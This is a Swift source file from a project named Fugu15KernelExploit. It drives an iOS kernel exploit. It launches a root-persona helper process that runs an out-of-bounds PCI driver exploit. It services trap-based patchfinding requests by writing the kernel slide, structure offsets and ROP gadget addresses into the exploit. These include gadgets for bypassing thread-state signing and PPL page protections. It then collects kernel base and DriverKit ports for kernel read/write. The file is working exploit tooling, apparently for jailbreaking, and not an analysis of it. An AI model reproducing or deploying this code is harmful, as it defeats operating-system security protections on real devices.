//
//  krw.swift
//  Fugu15KernelExploit
//
//  Created by Linus Henze.
//  Copyright Â© 2022 Pinauten GmbH. All rights reserved.
//  

import Foundation
import ProcessCommunication
import CBindings
import KernelPatchfinder

public class Fugu15DKKRW {
    public static var patchfinder = KernelPatchfinder.running
    
    public var comm: ProcessCommunication?
    
    let pciOff:   UInt64
    let kBase:    UInt64
    let virtBase: UInt64
    let physBase: UInt64
    let pciDev:   IOPCIDevice
    
    /**
     * Launch kernel exploit. Requires path to oobPCI.
     *
     * - Parameter oobPCI: Path to the oobPCI executable
     * - Parameter logger: A function to log messages
     *
     * - Warning: This function blocks, do not call it on the main dispatch queue
     */
    public init(oobPCI: URL, logger: @escaping (_ msg: String) -> Void) throws {
        // Launch a copy of this App which will then launch oobPCI
        switch Fugu15.supportsThisDevice() {
        case .yes:
            break
            
        case .no(reason: let reason):
            throw Fugu15LaunchError.deviceNotSupported(reason: reason)
        }
        
        // Create pipes to use for communication
        // We use control and log pipes
        let controlToChild = Pipe()
        let controlFromChild = Pipe()
        let logFromChild = Pipe()
        
        // We're entitled to do that ;)
        var attr: posix_spawnattr_t?
        posix_spawnattr_init(&attr)
        posix_spawnattr_set_persona_np(&attr, 99, 1)
        posix_spawnattr_set_persona_uid_np(&attr, 0)
        posix_spawnattr_set_persona_gid_np(&attr, 0)
        
        // Close unnecessary handles
        var fileActions: posix_spawn_file_actions_t?
        posix_spawn_file_actions_init(&fileActions)
        posix_spawn_file_actions_addclose(&fileActions, controlToChild.fileHandleForWriting.fileDescriptor)
        posix_spawn_file_actions_addclose(&fileActions, controlFromChild.fileHandleForReading.fileDescriptor)
        posix_spawn_file_actions_addclose(&fileActions, logFromChild.fileHandleForReading.fileDescriptor)
        
        var pid: pid_t = 0
        var argv: [UnsafeMutablePointer<CChar>?] = [
            strdup(CommandLine.arguments[0]),
            strdup("Fugu15_server"),
            strdup("\(controlToChild.fileHandleForReading.fileDescriptor)"),
            strdup("\(controlFromChild.fileHandleForWriting.fileDescriptor)"),
            strdup("\(logFromChild.fileHandleForWriting.fileDescriptor)"),
            nil
        ]
        
        defer {
            for arg in argv {
                free(arg)
            }
        }
        
        let result = posix_spawn(&pid, argv[0], &fileActions, &attr, &argv, environ)
        let err = errno
        guard result == 0 else {
            throw Fugu15LaunchError.posix_spawnFailed(result: result, errno: err)
        }
        
        try? controlToChild.fileHandleForReading.close()
        try? controlFromChild.fileHandleForWriting.close()
        try? logFromChild.fileHandleForWriting.close()
        
        DispatchQueue(label: "Fugu15-Logging").async {
            var buf = ""
            while true {
                autoreleasepool {
                    do {
                        let data = try logFromChild.fileHandleForReading.read(upToCount: 1)
                        if data == nil || data?.count == 0 {
                            return
                        }
                        
                        if data.unsafelyUnwrapped[0] == 0xA /* newline */ {
                            logger(buf)
                            buf = ""
                        } else {
                            buf += String(data: data.unsafelyUnwrapped, encoding: .utf8) ?? ""
                        }
                    } catch _ {
                        return
                    }
                }
            }
        }
        
        // Send ping
        let comm = ProcessCommunication(read: controlFromChild.fileHandleForReading, write: controlToChild.fileHandleForWriting)
        comm.sendCommand("ping")
        
        guard comm.receiveCommand() == ["pong"] else {
            throw Fugu15LaunchError.noPongReceived
        }
        
        comm.sendCommand("pwn", oobPCI.path)
        
        if comm.receiveCommand() != ["ok"] {
            throw Fugu15LaunchError.kexploitdFailed
        }
        
        comm.sendCommand("waitUntilDone", "\(getpid())")
        
        guard let reply = comm.receiveCommand(),
              reply.count == 7,
              reply[0] == "done" else {
            throw Fugu15LaunchError.kexploitdFailed
        }
        
        guard let dkServerPort = mach_port_t(reply[1]) else {
            throw Fugu15LaunchError.kexploitdFailed
        }
        
        guard let devPort = mach_port_t(reply[2]) else {
            throw Fugu15LaunchError.kexploitdFailed
        }
        
        guard let pciOff = UInt64(reply[3]) else {
            throw Fugu15LaunchError.kexploitdFailed
        }
        
        guard let kBase = UInt64(reply[4]) else {
            throw Fugu15LaunchError.kexploitdFailed
        }
        
        guard let virtBase = UInt64(reply[5]) else {
            throw Fugu15LaunchError.kexploitdFailed
        }
        
        guard let physBase = UInt64(reply[6]) else {
            throw Fugu15LaunchError.kexploitdFailed
        }
        
        let dk      = DriverKit(svPort: dkServerPort, ioPort: nil)
        self.pciDev = IOPCIDevice(dk: dk, device: devPort)
        
        self.pciOff   = pciOff
        self.kBase    = kBase
        self.virtBase = virtBase
        self.physBase = physBase
        
        self.comm = comm
    }
    
    internal static func serverMain(checkin: DKCheckinData) -> Never {
        //setsid()
        
        let controlIn = FileHandle(fileDescriptor: Int32(CommandLine.arguments[2])!, closeOnDealloc: true)
        let controlOut = FileHandle(fileDescriptor: Int32(CommandLine.arguments[3])!, closeOnDealloc: true)
        
        let comm = ProcessCommunication(read: controlIn, write: controlOut)
        
        var exitStatus: Int32?
        var done = false
        var exceptionHandler: UInt64?
        
        var dkServerPort: mach_port_t = 0
        var devPort:      mach_port_t = 0
        
        var pciOff:       UInt64 = 0
        var kBase:        UInt64 = 0
        var virtBase:     UInt64 = 0
        var physBase:     UInt64 = 0
        
        while true {
            guard let cmd = comm.receiveCommand() else {
                // Probably broken pipe
                exit(-1)
            }
            
            switch cmd[0] {
            case "ping":
                Logger.print("Hello from kernel exploit server!")
                Logger.print("My UID is \(getuid())")
                Logger.print("My GID is \(getgid())")
                
                comm.sendCommand("pong")
                
            case "pwn":
                do {
                    Logger.status("Launching oobPCI")
                    
                    guard cmd.count == 2 else {
                        comm.sendCommand("error", "Usage: pwn <oobPCI path>")
                        
                        break
                    }
                    
                    var args: [String] = []
                    if ProcessInfo.processInfo.operatingSystemVersion.minorVersion == 5 {
                        args.append("155")
                    }
                    
                    let driver = SpawnDrv(executable: URL(fileURLWithPath: cmd[1]))
                    driver.onExit { driver, status in
                        exitStatus = status
                    }
                    
                    try driver.launch(arguments: args, checkinData: checkin) { driver, task, thread, state in
                        let pc = thread_state64_get_pc(&state)
                        let lr = thread_state64_get_lr(&state)
                        
                        switch pc {
                        case 0x4841585800:
                            // Patchfind
                            return handlePatchfindRequest(driver, task, thread, &state)
                            
                        case 0x4841585808:
                            // Set exception handler
                            exceptionHandler = state.__x.0
                            break
                            
                        case 0x4841585814:
                            // Kernel exploit done notification
                            Logger.print("Attempting to copy out DK ports...")
                            let dkServerPortName = mach_port_name_t(state.__x.0)
                            let devPortName      = mach_port_name_t(state.__x.1)
                            
                            var acquired: mach_msg_type_name_t = 0
                            
                            var kr = mach_port_extract_right(task.tp, dkServerPortName, mach_msg_type_name_t(MACH_MSG_TYPE_COPY_SEND), &dkServerPort, &acquired)
                            guard kr == KERN_SUCCESS else {
                                Logger.print("Failed to copyout dkServerPort: \(kr)")
                                return KERN_FAILURE
                            }
                            
                            kr = mach_port_extract_right(task.tp, devPortName, mach_msg_type_name_t(MACH_MSG_TYPE_COPY_SEND), &devPort, &acquired)
                            guard kr == KERN_SUCCESS else {
                                Logger.print("Failed to copyout devPort: \(kr)")
                                return KERN_FAILURE
                            }
                            
                            Logger.print("Copied out DK ports!")
                            
                            pciOff   = state.__x.2
                            kBase    = state.__x.3
                            virtBase = state.__x.4
                            physBase = state.__x.5
                            
                            OSMemoryBarrier()
                            
                            done = true
                            
                        default:
                            if let exceptionHandler = exceptionHandler {
                                thread_state64_set_pc(&state, exceptionHandler)
                                return KERN_SUCCESS
                            } else {
                                return KERN_FAILURE
                            }
                        }
                        
                        thread_state64_set_pc(&state, lr)
                        return KERN_SUCCESS
                    }
                    
                    comm.sendCommand("ok")
                } catch let e {
                    Logger.print("SpawnDriver failed: \(e)")
                    
                    comm.sendCommand("error", "SpawnDrv failed!")
                }
                
            case "waitUntilDone":
                while !done && exitStatus == nil {
                    usleep(10000)
                }
                
                if done {
                    // Copy ports to parent
                    guard let parent = Task.forPID(pid_t(cmd[1])!) else {
                        comm.sendCommand("error", "Failed to get parent task!")
                        continue
                    }
                    
                    guard let parentDkServerPortName = parent.grantSendRight(to: dkServerPort) else {
                        comm.sendCommand("error", "Failed to copyout dkServerPort!")
                        continue
                    }
                    
                    Logger.print("Copied dkServerPort to parent")
                    
                    guard let parentDevPortName = parent.grantSendRight(to: devPort) else {
                        comm.sendCommand("error", "Failed to copyout devPort!")
                        continue
                    }
                    
                    Logger.print("Copied devPort to parent")
                    
                    comm.sendCommand("done", "\(parentDkServerPortName)", "\(parentDevPortName)", "\(pciOff)", "\(kBase)", "\(virtBase)", "\(physBase)")
                } else {
                    comm.sendCommand("error", "Exit status: \(exitStatus.unsafelyUnwrapped)")
                }
                
            case "exit":
                exit(0)
                
            default:
                comm.sendCommand("error", "Unknown command \(cmd[0])!")
            }
        }
    }
    
    internal static func handlePatchfindRequest(_ driver: SpawnDrv, _ child: Task, _ thread: Thread, _ state: inout arm_thread_state64_t) -> kern_return_t {
        // Patchfind stuff
        let offsetInfoAddr = state.__x.1
        func writeOffsetInfo(_ pos: Int, value: UInt64) {
            Logger.print("Pos \(pos): " + String(format: "%p", value))
            child.w64(offsetInfoAddr + UInt64(pos * 8), value)
        }
        
        var ok = false
        repeat {
            Logger.print("Loading kernel...")
            var start = time(nil)
            
            guard let pf = patchfinder else {
                Logger.print("Failed: KernelPatchfinder.running")
                break
            }
            
            Logger.print("Loading took \(time(nil) - start) second(s)!")
            
            Logger.print("Patchfinding...")
            
            start = time(nil)
            
            writeOffsetInfo(0, value: state.__x.0 &- 0xFFFFFFF007004000) // Kernel slide
            
            guard let allproc = pf.allproc else {
                Logger.print("Failed: pf.allproc")
                break
            }
            
            writeOffsetInfo(1, value: allproc)
            
            guard let ITK_SPACE = pf.ITK_SPACE else {
                Logger.print("Failed: pf.ITK_SPACE")
                break
            }
            
            writeOffsetInfo(2, value: ITK_SPACE)
            
            guard let cpu_ttep = pf.cpu_ttep else {
                Logger.print("Failed: pf.cpu_ttep")
                break
            }
            
            writeOffsetInfo(3, value: cpu_ttep)
            
            guard let pmap_enter_options_addr = pf.pmap_enter_options_addr else {
                Logger.print("Failed: pf.pmap_enter_options_addr")
                break
            }
            
            writeOffsetInfo(4, value: pmap_enter_options_addr)
            
            guard let hw_lck_ticket_reserve_orig_allow_invalid_signed = pf.hw_lck_ticket_reserve_orig_allow_invalid_signed else {
                Logger.print("Failed: pf.hw_lck_ticket_reserve_orig_allow_invalid_signed")
                break
            }
            
            writeOffsetInfo(5, value: hw_lck_ticket_reserve_orig_allow_invalid_signed)
            
            guard let hw_lck_ticket_reserve_orig_allow_invalid = pf.hw_lck_ticket_reserve_orig_allow_invalid else {
                Logger.print("Failed: pf.hw_lck_ticket_reserve_orig_allow_invalid")
                break
            }
            
            writeOffsetInfo(6, value: hw_lck_ticket_reserve_orig_allow_invalid)
            
            guard let br_x22_gadget = pf.br_x22_gadget else {
                Logger.print("Failed: pf.br_x22_gadget")
                break
            }
            
            writeOffsetInfo(7, value: br_x22_gadget)
            
            guard let exception_return = pf.exception_return else {
                Logger.print("Failed: pf.exception_return")
                break
            }
            
            writeOffsetInfo(8, value: exception_return)
            
            guard let ldp_x0_x1_x8_gadget = pf.ldp_x0_x1_x8_gadget else {
                Logger.print("Failed: pf.ldp_x0_x1_x8_gadget")
                break
            }
            
            writeOffsetInfo(9, value: ldp_x0_x1_x8_gadget)
            
            guard let exception_return_after_check = pf.exception_return_after_check else {
                Logger.print("Failed: pf.exception_return_after_check")
                break
            }
            
            writeOffsetInfo(10, value: exception_return_after_check)
            
            guard let exception_return_after_check_no_restore = pf.exception_return_after_check_no_restore else {
                Logger.print("Failed: pf.exception_return_after_check_no_restore")
                break
            }
            
            writeOffsetInfo(11, value: exception_return_after_check_no_restore)
            
            guard let str_x8_x9_gadget = pf.str_x8_x9_gadget else {
                Logger.print("Failed: pf.str_x8_x9_gadget")
                break
            }
            
            writeOffsetInfo(12, value: str_x8_x9_gadget)
            
            guard let str_x0_x19_ldr_x20 = pf.str_x0_x19_ldr_x20 else {
                Logger.print("Failed: pf.str_x0_x19_ldr_x20")
                break
            }
            
            writeOffsetInfo(13, value: str_x0_x19_ldr_x20)
            
            guard let pmap_set_nested = pf.pmap_set_nested else {
                Logger.print("Failed: pf.pmap_set_nested")
                break
            }
            
            writeOffsetInfo(14, value: pmap_set_nested)
            
            guard let pmap_nest = pf.pmap_nest else {
                Logger.print("Failed: pf.pmap_nest")
                break
            }
            
            writeOffsetInfo(15, value: pmap_nest)
            
            guard let pmap_remove_options = pf.pmap_remove_options else {
                Logger.print("Failed: pf.pmap_remove_options")
                break
            }
            
            writeOffsetInfo(16, value: pmap_remove_options)
            
            guard let pmap_mark_page_as_ppl_page = pf.pmap_mark_page_as_ppl_page else {
                Logger.print("Failed: pf.pmap_mark_page_as_ppl_page")
                break
            }
            
            writeOffsetInfo(17, value: pmap_mark_page_as_ppl_page)
            
            guard let pmap_create_options = pf.pmap_create_options else {
                Logger.print("Failed: pf.pmap_create_options")
                break
            }
            
            writeOffsetInfo(18, value: pmap_create_options)
            
            guard let ml_sign_thread_state = pf.ml_sign_thread_state else {
                Logger.print("Failed: pf.ml_sign_thread_state")
                break
            }
            
            writeOffsetInfo(19, value: ml_sign_thread_state)
            
            guard let kernel_el = pf.kernel_el else {
                Logger.print("Failed: pf.kernel_el")
                break
            }
            
            writeOffsetInfo(20, value: kernel_el << 2)
            
            guard let TH_RECOVER = pf.TH_RECOVER else {
                Logger.print("Failed: pf.TH_RECOVER")
                break
            }
            
            writeOffsetInfo(21, value: TH_RECOVER)
            
            guard let TH_KSTACKPTR = pf.TH_KSTACKPTR else {
                Logger.print("Failed: pf.TH_KSTACKPTR")
                break
            }
            
            writeOffsetInfo(22, value: TH_KSTACKPTR)
            
            guard let ACT_CONTEXT = pf.ACT_CONTEXT else {
                Logger.print("Failed: pf.ACT_CONTEXT")
                break
            }
            
            writeOffsetInfo(23, value: ACT_CONTEXT)
            
            guard let ACT_CPUDATAP = pf.ACT_CPUDATAP else {
                Logger.print("Failed: pf.ACT_CPUDATAP")
                break
            }
            
            writeOffsetInfo(24, value: ACT_CPUDATAP)
            
            var PORT_KOBJECT: UInt64 = 0x58
            if ProcessInfo.processInfo.operatingSystemVersion.majorVersion >= 15 && ProcessInfo.processInfo.operatingSystemVersion.minorVersion >= 2 {
                PORT_KOBJECT = 0x48
            }
            
            writeOffsetInfo(25, value: PORT_KOBJECT)
            
            guard let VM_MAP_PMAP = pf.VM_MAP_PMAP else {
                Logger.print("Failed: pf.VM_MAP_PMAP")
                break
            }
            
            writeOffsetInfo(26, value: VM_MAP_PMAP)
            
            guard let PORT_LABEL = pf.PORT_LABEL else {
                Logger.print("Failed: pf.PORT_LABEL")
                break
            }
            
            writeOffsetInfo(27, value: PORT_LABEL)
            
            Logger.print("Patchfinding took \(time(nil) - start) second(s)!")
            
            ok = true
        } while false
        
        state.__x.0 = ok ? 1 : 0
        
        let lr = thread_state64_get_lr(&state)
        thread_state64_set_pc(&state, lr)
        
        return ok ? KERN_SUCCESS : KERN_FAILURE
    }
    
    deinit {
        comm?.sendCommand("exit")
    }
}
